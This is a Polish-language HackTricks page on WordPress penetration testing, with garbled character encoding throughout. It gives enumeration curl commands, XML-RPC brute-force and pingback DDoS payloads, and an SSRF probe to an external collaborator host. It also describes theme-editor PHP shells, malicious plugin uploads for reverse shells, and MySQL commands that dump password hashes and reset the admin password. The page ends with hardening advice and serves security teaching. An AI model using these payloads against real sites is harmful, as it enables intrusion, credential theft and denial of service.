# Wordpress

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** zasilane przez **najbardziej zaawansowane** narzÄ™dzia spoÅ‚ecznoÅ›ciowe na Å›wiecie.\
Uzyskaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Podstawowe informacje

**PrzesÅ‚ane** pliki trafiajÄ… do: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
**Pliki motywÃ³w moÅ¼na znaleÅºÄ‡ w /wp-content/themes/,** wiÄ™c jeÅ›li zmienisz jakiÅ› plik php motywu, aby uzyskaÄ‡ RCE, prawdopodobnie uÅ¼yjesz tej Å›cieÅ¼ki. Na przykÅ‚ad: UÅ¼ywajÄ…c **motywu twentytwelve**, moÅ¼esz **uzyskaÄ‡ dostÄ™p** do pliku **404.php** w: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**Inny przydatny adres URL to:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

W **wp-config.php** moÅ¼esz znaleÅºÄ‡ hasÅ‚o root do bazy danych.

DomyÅ›lne Å›cieÅ¼ki logowania do sprawdzenia: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **GÅ‚Ã³wne pliki WordPressa**

* `index.php`
* `license.txt` zawiera przydatne informacje, takie jak zainstalowana wersja WordPressa.
* `wp-activate.php` jest uÅ¼ywany do procesu aktywacji e-maila podczas konfigurowania nowej witryny WordPress.
* Foldery logowania (mogÄ… byÄ‡ przemianowane, aby je ukryÄ‡):
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` to plik, ktÃ³ry reprezentuje funkcjÄ™ WordPressa, ktÃ³ra umoÅ¼liwia przesyÅ‚anie danych za pomocÄ… HTTP jako mechanizmu transportowego i XML jako mechanizmu kodowania. Tego typu komunikacja zostaÅ‚a zastÄ…piona przez [REST API](https://developer.wordpress.org/rest-api/reference) WordPressa.
* Folder `wp-content` to gÅ‚Ã³wny katalog, w ktÃ³rym przechowywane sÄ… wtyczki i motywy.
* `wp-content/uploads/` to katalog, w ktÃ³rym przechowywane sÄ… wszelkie pliki przesÅ‚ane na platformÄ™.
* `wp-includes/` To katalog, w ktÃ³rym przechowywane sÄ… pliki rdzeniowe, takie jak certyfikaty, czcionki, pliki JavaScript i widÅ¼ety.
* `wp-sitemap.xml` W wersjach WordPressa 5.5 i wyÅ¼szych, WordPress generuje plik XML mapy witryny ze wszystkimi publicznymi postami oraz publicznie zapytalnymi typami postÃ³w i taksonomiami.

**Post exploitation**

* Plik `wp-config.php` zawiera informacje wymagane przez WordPress do poÅ‚Ä…czenia z bazÄ… danych, takie jak nazwa bazy danych, host bazy danych, nazwa uÅ¼ytkownika i hasÅ‚o, klucze uwierzytelniajÄ…ce i sÃ³l oraz prefiks tabeli bazy danych. Ten plik konfiguracyjny moÅ¼e byÄ‡ rÃ³wnieÅ¼ uÅ¼ywany do aktywacji trybu DEBUG, co moÅ¼e byÄ‡ przydatne w rozwiÄ…zywaniu problemÃ³w.

### Uprawnienia uÅ¼ytkownikÃ³w

* **Administrator**
* **Redaktor**: Publikuje i zarzÄ…dza swoimi i innymi postami
* **Autor**: Publikuje i zarzÄ…dza swoimi postami
* **WspÃ³Å‚autor**: Pisze i zarzÄ…dza swoimi postami, ale nie moÅ¼e ich publikowaÄ‡
* **Subskrybent**: PrzeglÄ…da posty i edytuje swÃ³j profil

## **Pasywna enumeracja**

### **Uzyskaj wersjÄ™ WordPressa**

SprawdÅº, czy moÅ¼esz znaleÅºÄ‡ pliki `/license.txt` lub `/readme.html`

W **kodzie ÅºrÃ³dÅ‚owym** strony (przykÅ‚ad z [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (1111).png>)

* Pliki linkÃ³w CSS

![](<../../.gitbook/assets/image (533).png>)

* Pliki JavaScript

![](<../../.gitbook/assets/image (524).png>)

### Pobierz wtyczki

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Pobierz motywy

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
{% endcode %}

### Ekstrakcja wersji ogÃ³lnie

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** zasilane przez **najbardziej zaawansowane** narzÄ™dzia spoÅ‚ecznoÅ›ciowe na Å›wiecie.\
Uzyskaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Aktywna enumeracja

### Wtyczki i motywy

Prawdopodobnie nie bÄ™dziesz w stanie znaleÅºÄ‡ wszystkich moÅ¼liwych Wtyczek i MotywÃ³w. Aby odkryÄ‡ je wszystkie, bÄ™dziesz musiaÅ‚ **aktywnie przeprowadziÄ‡ Brute Force listy Wtyczek i MotywÃ³w** (na szczÄ™Å›cie dla nas istniejÄ… zautomatyzowane narzÄ™dzia, ktÃ³re zawierajÄ… te listy).

### UÅ¼ytkownicy

**ID Brute**

Uzyskujesz waÅ¼nych uÅ¼ytkownikÃ³w z witryny WordPress, przeprowadzajÄ…c Brute Force na identyfikatorach uÅ¼ytkownikÃ³w:
```
curl -s -I -X GET http://blog.example.com/?author=1
```
JeÅ›li odpowiedzi sÄ… **200** lub **30X**, oznacza to, Å¼e id jest **waÅ¼ne**. JeÅ›li odpowiedÅº to **400**, to id jest **niewaÅ¼ne**.

**wp-json**

MoÅ¼esz rÃ³wnieÅ¼ sprÃ³bowaÄ‡ uzyskaÄ‡ informacje o uÅ¼ytkownikach, wykonujÄ…c zapytanie:
```
curl http://blog.example.com/wp-json/wp/v2/users
```
Inny punkt koÅ„cowy `/wp-json/`, ktÃ³ry moÅ¼e ujawniÄ‡ pewne informacje o uÅ¼ytkownikach, to:
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ZauwaÅ¼, Å¼e ten punkt koÅ„cowy ujawnia tylko uÅ¼ytkownikÃ³w, ktÃ³rzy opublikowali post. **Dostarczone bÄ™dÄ… tylko informacje o uÅ¼ytkownikach, ktÃ³rzy majÄ… wÅ‚Ä…czonÄ… tÄ™ funkcjÄ™**.

ZauwaÅ¼ rÃ³wnieÅ¼, Å¼e **/wp-json/wp/v2/pages** moÅ¼e ujawniaÄ‡ adresy IP.

#### Enumeracja nazw uÅ¼ytkownikÃ³w logowania

Podczas logowania w **`/wp-login.php`** **wiadomoÅ›Ä‡** jest **inna**, jeÅ›li wskazana **nazwa uÅ¼ytkownika istnieje lub nie**.

### XML-RPC

JeÅ›li `xml-rpc.php` jest aktywne, moÅ¼esz przeprowadziÄ‡ atak brute-force na dane logowania lub uÅ¼yÄ‡ go do przeprowadzenia atakÃ³w DoS na inne zasoby. (MoÅ¼esz zautomatyzowaÄ‡ ten proces[ uÅ¼ywajÄ…c tego](https://github.com/relarizky/wpxploit) na przykÅ‚ad).

Aby sprawdziÄ‡, czy jest aktywne, sprÃ³buj uzyskaÄ‡ dostÄ™p do _**/xmlrpc.php**_ i wyÅ›lij to Å¼Ä…danie:

**SprawdÅº**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce poÅ›wiadczeÅ„**

**`wp.getUserBlogs`**, **`wp.getCategories`** lub **`metaWeblog.getUsersBlogs`** to niektÃ³re z metod, ktÃ³re moÅ¼na wykorzystaÄ‡ do bruteforce poÅ›wiadczeÅ„. JeÅ›li znajdziesz ktÃ³rÄ…kolwiek z nich, moÅ¼esz wysÅ‚aÄ‡ coÅ› takiego:
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
WiadomoÅ›Ä‡ _"NieprawidÅ‚owa nazwa uÅ¼ytkownika lub hasÅ‚o"_ wewnÄ…trz odpowiedzi z kodem 200 powinna siÄ™ pojawiÄ‡, jeÅ›li dane uwierzytelniajÄ…ce sÄ… nieprawidÅ‚owe.

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../.gitbook/assets/image (721).png>)

UÅ¼ywajÄ…c prawidÅ‚owych danych uwierzytelniajÄ…cych, moÅ¼esz przesÅ‚aÄ‡ plik. W odpowiedzi pojawi siÄ™ Å›cieÅ¼ka ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
RÃ³wnieÅ¼ istnieje **szybszy sposÃ³b** na brute-force'owanie poÅ›wiadczeÅ„ za pomocÄ… **`system.multicall`**, poniewaÅ¼ moÅ¼esz sprÃ³bowaÄ‡ kilku poÅ›wiadczeÅ„ w tym samym Å¼Ä…daniu:

<figure><img src="../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>

**ObejÅ›cie 2FA**

Ta metoda jest przeznaczona dla programÃ³w, a nie dla ludzi, i jest stara, dlatego nie obsÅ‚uguje 2FA. WiÄ™c, jeÅ›li masz waÅ¼ne poÅ›wiadczenia, ale gÅ‚Ã³wne wejÅ›cie jest chronione przez 2FA, **moÅ¼esz byÄ‡ w stanie wykorzystaÄ‡ xmlrpc.php do zalogowania siÄ™ z tymi poÅ›wiadczeniami, omijajÄ…c 2FA**. ZauwaÅ¼, Å¼e nie bÄ™dziesz w stanie wykonaÄ‡ wszystkich dziaÅ‚aÅ„, ktÃ³re moÅ¼esz wykonaÄ‡ przez konsolÄ™, ale nadal moÅ¼esz uzyskaÄ‡ dostÄ™p do RCE, jak wyjaÅ›nia to Ippsec w [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)

**DDoS lub skanowanie portÃ³w**

JeÅ›li moÅ¼esz znaleÅºÄ‡ metodÄ™ _**pingback.ping**_ na liÅ›cie, moÅ¼esz sprawiÄ‡, Å¼e Wordpress wyÅ›le dowolne Å¼Ä…danie do dowolnego hosta/portu.\
MoÅ¼na to wykorzystaÄ‡ do poproszenia **tysiÄ™cy** stron **Wordpress** o **dostÄ™p** do jednej **lokalizacji** (w ten sposÃ³b powodowany jest **DDoS** w tej lokalizacji) lub moÅ¼esz to wykorzystaÄ‡, aby **Wordpress** lo **zeskanowaÅ‚** jakÄ…Å› wewnÄ™trznÄ… **sieÄ‡** (moÅ¼esz wskazaÄ‡ dowolny port).
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1\_JaUYIZF8ZjDGGB7ocsZC-g.png)

JeÅ›li otrzymasz **faultCode** z wartoÅ›ciÄ… **wiÄ™kszÄ…** niÅ¼ **0** (17), oznacza to, Å¼e port jest otwarty.

Zobacz uÅ¼ycie **`system.multicall`** w poprzedniej sekcji, aby dowiedzieÄ‡ siÄ™, jak wykorzystaÄ‡ tÄ™ metodÄ™ do spowodowania DDoS.

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (110).png>)

### wp-cron.php DoS

Ten plik zazwyczaj znajduje siÄ™ w katalogu gÅ‚Ã³wnym witryny Wordpress: **`/wp-cron.php`**\
Gdy ten plik jest **dostÄ™pny**, wykonywane jest "**ciÄ™Å¼kie**" zapytanie MySQL, wiÄ™c moÅ¼e byÄ‡ uÅ¼yty przez **atakujÄ…cych** do **spowodowania** **DoS**.\
Ponadto, domyÅ›lnie `wp-cron.php` jest wywoÅ‚ywany przy kaÅ¼dym zaÅ‚adowaniu strony (za kaÅ¼dym razem, gdy klient Å¼Ä…da jakiejkolwiek strony Wordpress), co na stronach o duÅ¼ym ruchu moÅ¼e powodowaÄ‡ problemy (DoS).

Zaleca siÄ™ wyÅ‚Ä…czenie Wp-Cron i utworzenie prawdziwego zadania cron na hoÅ›cie, ktÃ³re wykonuje potrzebne dziaÅ‚ania w regularnych odstÄ™pach czasu (bez powodowania problemÃ³w).

### /wp-json/oembed/1.0/proxy - SSRF

SprÃ³buj uzyskaÄ‡ dostÄ™p do _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i witryna Worpress moÅ¼e wysÅ‚aÄ‡ do Ciebie Å¼Ä…danie.

To jest odpowiedÅº, gdy to nie dziaÅ‚a:

![](<../../.gitbook/assets/image (365).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

To narzÄ™dzie sprawdza, czy **methodName: pingback.ping** oraz Å›cieÅ¼ka **/wp-json/oembed/1.0/proxy** istniejÄ…, a jeÅ›li tak, prÃ³buje je wykorzystaÄ‡.

### NarzÄ™dzia automatyczne
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** zasilane przez **najbardziej zaawansowane** narzÄ™dzia spoÅ‚ecznoÅ›ciowe na Å›wiecie.\
Uzyskaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

## Uzyskaj dostÄ™p, nadpisujÄ…c jeden bit

WiÄ™cej niÅ¼ prawdziwy atak, to ciekawostka. W CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) moÅ¼esz zmieniÄ‡ 1 bit w dowolnym pliku wordpress. MoÅ¼esz wiÄ™c zmieniÄ‡ pozycjÄ™ `5389` pliku `/var/www/html/wp-includes/user.php`, aby zignorowaÄ‡ operacjÄ™ NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modyfikacja pliku php z uÅ¼ywanego motywu (wymagane dane logowania administratora)**

WyglÄ…d â†’ Edytor motywÃ³w â†’ Szablon 404 (po prawej)

ZmieÅ„ zawartoÅ›Ä‡ na powÅ‚okÄ™ php:

![](<../../.gitbook/assets/image (384).png>)

Szukaj w internecie, jak moÅ¼esz uzyskaÄ‡ dostÄ™p do zaktualizowanej strony. W tym przypadku musisz uzyskaÄ‡ dostÄ™p tutaj: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¼esz uÅ¼yÄ‡:
```
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

MoÅ¼liwe, Å¼e moÅ¼na przesÅ‚aÄ‡ pliki .php jako wtyczkÄ™.\
UtwÃ³rz swÃ³j php backdoor uÅ¼ywajÄ…c na przykÅ‚ad:

![](<../../.gitbook/assets/image (183).png>)

NastÄ™pnie dodaj nowÄ… wtyczkÄ™:

![](<../../.gitbook/assets/image (722).png>)

PrzeÅ›lij wtyczkÄ™ i naciÅ›nij Zainstaluj teraz:

![](<../../.gitbook/assets/image (249).png>)

Kliknij na Kontynuuj:

![](<../../.gitbook/assets/image (70).png>)

Prawdopodobnie to nic nie zrobi, ale jeÅ›li przejdziesz do MediÃ³w, zobaczysz przesÅ‚anÄ… powÅ‚okÄ™:

![](<../../.gitbook/assets/image (462).png>)

Uzyskaj do niej dostÄ™p, a zobaczysz URL do wykonania odwrotnej powÅ‚oki:

![](<../../.gitbook/assets/image (1006).png>)

### Uploading and activating malicious plugin

Ta metoda polega na zainstalowaniu zÅ‚oÅ›liwej wtyczki, ktÃ³ra jest znana jako podatna i moÅ¼e byÄ‡ wykorzystana do uzyskania powÅ‚oki sieciowej. Proces ten odbywa siÄ™ przez pulpit WordPressa w nastÄ™pujÄ…cy sposÃ³b:

1. **Pozyskiwanie wtyczki**: Wtyczka jest pozyskiwana z ÅºrÃ³dÅ‚a takiego jak Exploit DB jak [**tutaj**](https://www.exploit-db.com/exploits/36374).
2. **Instalacja wtyczki**:
* PrzejdÅº do pulpitu WordPressa, a nastÄ™pnie do `Pulpit > Wtyczki > PrzeÅ›lij wtyczkÄ™`.
* PrzeÅ›lij plik zip pobranej wtyczki.
3. **Aktywacja wtyczki**: Po pomyÅ›lnej instalacji wtyczka musi byÄ‡ aktywowana przez pulpit.
4. **Eksploatacja**:
* Z wtyczkÄ… "reflex-gallery" zainstalowanÄ… i aktywowanÄ…, moÅ¼na jÄ… wykorzystaÄ‡, poniewaÅ¼ jest znana jako podatna.
* Framework Metasploit zapewnia exploit dla tej podatnoÅ›ci. ÅadujÄ…c odpowiedni moduÅ‚ i wykonujÄ…c konkretne polecenia, moÅ¼na nawiÄ…zaÄ‡ sesjÄ™ meterpreter, co daje nieautoryzowany dostÄ™p do witryny.
* ZauwaÅ¼ono, Å¼e to tylko jedna z wielu metod eksploatacji witryny WordPress.

ZawartoÅ›Ä‡ zawiera wizualne pomoce ilustrujÄ…ce kroki w pulpicie WordPressa dotyczÄ…ce instalacji i aktywacji wtyczki. WaÅ¼ne jest jednak, aby zauwaÅ¼yÄ‡, Å¼e eksploatacja podatnoÅ›ci w ten sposÃ³b jest nielegalna i nieetyczna bez odpowiedniej autoryzacji. Informacje te powinny byÄ‡ uÅ¼ywane odpowiedzialnie i tylko w kontekÅ›cie prawnym, takim jak testy penetracyjne z wyraÅºnym pozwoleniem.

**Aby uzyskaÄ‡ bardziej szczegÃ³Å‚owe kroki, sprawdÅº:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

* [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ to skrypt zaprojektowany do eskalacji podatnoÅ›ci **Cross-Site Scripting (XSS)** do **Remote Code Execution (RCE)** lub innych krytycznych podatnoÅ›ci w WordPressie. Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº [**ten post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Oferuje **wsparcie dla wersji WordPress 6.X.X, 5.X.X i 4.X.X oraz pozwala na:**
* _**Eskalacja uprawnieÅ„:**_ Tworzy uÅ¼ytkownika w WordPressie.
* _**(RCE) PrzesyÅ‚anie zÅ‚oÅ›liwej wtyczki (backdoor):**_ PrzeÅ›lij swojÄ… zÅ‚oÅ›liwÄ… wtyczkÄ™ (backdoor) do WordPressa.
* _**(RCE) Edycja wbudowanej wtyczki:**_ Edytuj wbudowane wtyczki w WordPressie.
* _**(RCE) Edycja wbudowanego motywu:**_ Edytuj wbudowane motywy w WordPressie.
* _**(Custom) ZÅ‚oÅ›liwe exploity:**_ ZÅ‚oÅ›liwe exploity dla wtyczek/motywÃ³w WordPressa innych firm.

## Post Exploitation

WyciÄ…gnij nazwy uÅ¼ytkownikÃ³w i hasÅ‚a:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ZmieÅ„ hasÅ‚o administratora:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Powierzchnia ataku

ZnajomoÅ›Ä‡ tego, jak wtyczka Wordpress moÅ¼e ujawniaÄ‡ funkcjonalnoÅ›Ä‡, jest kluczowa, aby znaleÅºÄ‡ luki w jej funkcjonalnoÅ›ci. MoÅ¼esz znaleÅºÄ‡, jak wtyczka moÅ¼e ujawniaÄ‡ funkcjonalnoÅ›Ä‡ w poniÅ¼szych punktach oraz kilka przykÅ‚adÃ³w podatnych wtyczek w [**tym wpisie na blogu**](https://nowotarski.info/wordpress-nonce-authorization/).

* **`wp_ajax`**&#x20;

Jednym ze sposobÃ³w, w jaki wtyczka moÅ¼e ujawniaÄ‡ funkcje, jest za pomocÄ… handlerÃ³w AJAX. MogÄ… one zawieraÄ‡ bÅ‚Ä™dy logiki, autoryzacji lub uwierzytelniania. Co wiÄ™cej, czÄ™sto te funkcje bÄ™dÄ… opieraÄ‡ zarÃ³wno uwierzytelnianie, jak i autoryzacjÄ™ na istnieniu nonce Wordpress, ktÃ³ry **moÅ¼e mieÄ‡ kaÅ¼dy uÅ¼ytkownik uwierzytelniony w instancji Wordpress** (niezaleÅ¼nie od jego roli).

To sÄ… funkcje, ktÃ³re mogÄ… byÄ‡ uÅ¼ywane do ujawniania funkcji w wtyczce:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**UÅ¼ycie `nopriv` sprawia, Å¼e punkt koÅ„cowy jest dostÄ™pny dla wszystkich uÅ¼ytkownikÃ³w (nawet niezautoryzowanych).**

{% hint style="danger" %}
Ponadto, jeÅ›li funkcja tylko sprawdza autoryzacjÄ™ uÅ¼ytkownika za pomocÄ… funkcji `wp_verify_nonce`, ta funkcja tylko sprawdza, czy uÅ¼ytkownik jest zalogowany, zazwyczaj nie sprawdza roli uÅ¼ytkownika. Tak wiÄ™c uÅ¼ytkownicy o niskich uprawnieniach mogÄ… mieÄ‡ dostÄ™p do dziaÅ‚aÅ„ o wysokich uprawnieniach.
{% endhint %}

* **REST API**

MoÅ¼liwe jest rÃ³wnieÅ¼ udostÄ™pnienie funkcji z WordPressa, rejestrujÄ…c REST API za pomocÄ… funkcji `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` to funkcja zwrotna, ktÃ³ra sprawdza, czy dany uÅ¼ytkownik ma uprawnienia do wywoÅ‚ania metody API.

**JeÅ›li uÅ¼ywana jest wbudowana funkcja `__return_true`, po prostu pominie sprawdzenie uprawnieÅ„ uÅ¼ytkownika.**

* **BezpoÅ›redni dostÄ™p do pliku php**

OczywiÅ›cie, Wordpress uÅ¼ywa PHP, a pliki wewnÄ…trz wtyczek sÄ… bezpoÅ›rednio dostÄ™pne z sieci. Tak wiÄ™c, w przypadku, gdy wtyczka ujawnia jakÄ…kolwiek podatnÄ… funkcjonalnoÅ›Ä‡, ktÃ³ra jest wywoÅ‚ywana po prostu przez dostÄ™p do pliku, bÄ™dzie to wykorzystywalne przez kaÅ¼dego uÅ¼ytkownika.

## Ochrona WordPressa

### Regularne aktualizacje

Upewnij siÄ™, Å¼e WordPress, wtyczki i motywy sÄ… aktualne. PotwierdÅº rÃ³wnieÅ¼, Å¼e automatyczne aktualizacje sÄ… wÅ‚Ä…czone w wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **instaluj tylko zaufane wtyczki i motywy WordPress**.

### Wtyczki zabezpieczajÄ…ce

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Inne rekomendacje**

* UsuÅ„ domyÅ›lnego uÅ¼ytkownika **admin**
* UÅ¼ywaj **silnych haseÅ‚** i **2FA**
* Okresowo **przeglÄ…daj** uprawnienia uÅ¼ytkownikÃ³w
* **Ogranicz prÃ³by logowania**, aby zapobiec atakom Brute Force
* ZmieÅ„ nazwÄ™ pliku **`wp-admin.php`** i zezwÃ³l na dostÄ™p tylko wewnÄ™trznie lub z okreÅ›lonych adresÃ³w IP.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=wordpress), aby Å‚atwo budowaÄ‡ i **automatyzowaÄ‡ przepÅ‚ywy pracy** zasilane przez **najbardziej zaawansowane** narzÄ™dzia spoÅ‚ecznoÅ›ciowe na Å›wiecie.\
Uzyskaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na GitHubie.

